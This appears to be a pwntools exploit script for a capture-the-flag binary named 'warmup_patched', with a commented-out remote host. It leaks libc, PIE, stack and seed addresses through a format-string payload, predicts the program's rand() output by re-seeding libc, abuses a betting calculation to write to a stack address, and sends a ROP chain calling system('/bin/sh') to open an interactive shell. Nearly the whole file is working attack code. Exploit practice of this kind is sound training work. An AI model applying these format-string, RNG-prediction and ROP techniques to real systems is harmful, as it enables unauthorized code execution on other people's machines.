from pwn import * 
from ctypes import CDLL
r = process('./warmup_patched')
# r = remote('34.171.160.79', 9998)
elf = context.binary = ELF('./warmup_patched')
libc = ELF('./libc-2.23.so')
libc_ = CDLL('./libc.so.6')
# r.sendlineafter(b'How much money you want? ',b'0')
# payload = b'%p#'*100
# r.sendlineafter(b'name: ',payload)
# r.recvuntil(b'Welcome to lucky game                            *')
# r.recvuntil(b'**************************************************')
# leak = r.recvuntil(b'*').strip().split(b'#')
# print(leak)
# debug=1
# if debug:
#     i=1
#     for address in leak:
#         if  address.decode().startswith("0x5") and address.decode().endswith("6"):
#             log.info(f"main leak [{i}]: {address.decode()}")
#         elif len(address) > 16 and address.decode().endswith("00"):
#             log.info(f"Canary candidate [{i}]: {address.decode()}")
#         elif address.decode().startswith("0x7f"):
#             log.info(f"Libc candidate [{i}]: {address.decode()}")
#         elif address.decode().startswith("0x7f") and address.decode().endswith("0"):
#             log.info(f"Stack leak [{i}]: {address.decode()}")
#         elif len(address) > 8 and address.decode().startswith("0x3"):
#             log.info(f"Seed leak [{i}]: {address.decode()}")

#         i += 1
# -------------------------------------------
# | [*] Libc candidate [1]: 0x7f934f3316a3  |
# | [*] Seed leak [23]: 0x3ab2989b7         |  
# | [*] Stack candidate [26]: 0x7ffc38c62110|
# | [*] main leak [33]: 0x56364f6011b6      |
# -------------------------------------------
r.sendlineafter(b'How much money you want? ',b'0')

r.sendlineafter(b'name: ',b'%88c%12$hhn#%1$p#%23$p#%26$p#%33$p')
r.recvuntil(b'Welcome to lucky game                            *')
r.recvuntil(b'**************************************************')
leak = r.recvuntil(b'*').strip().split(b'#')
print(leak)
libc_leak = int(leak[1],16)
seed = int(leak[2],16)
stack_leak = int(leak[3],16)
main_leak = int(leak[4][:14],16)
print('libc leak: ',hex(libc_leak))
print('seed leak: ',hex(seed))
print('stack: ',hex(stack_leak))
print('pie leak: ',hex(main_leak))
# gdb.attach(r)
elf.address = main_leak - elf.sym['main']
libc.address = libc_leak - 0x3c56a3

print('-----------------------------')
print('pie base: ', hex(elf.address))
print('libc base: ',hex(libc.address))
# gdb.attach(r,gdbscript = '''
#     b *0x0055555540110C
#     b * playgame
#     continue
#     '''
# )
r.recvuntil(b'Your money: ')
money_leak  = int(r.recvline().strip())
print('money: ',hex(money_leak))
libc_.srand(seed)

value_moment = libc_.rand()
print('value at the moment: ',hex(value_moment))
forgery = (stack_leak + 8) - (libc_.rand() + money_leak)
r.sendlineafter(b'Your vote (= 0 to exit): ',str(forgery).encode())
r.sendlineafter(b'Your number: ',str(value_moment).encode())

rdi = elf.address + 0x0000000000001243
ret = elf.address + 0x00000000000009be
r.sendlineafter(b'Your vote (= 0 to exit):',b'0')
payload = p64(ret) + p64(rdi) + p64(next(libc.search(b'/bin/sh'))) + p64(libc.sym['system'])
r.recvuntil(b'feeback:')
r.sendline(payload)
r.interactive()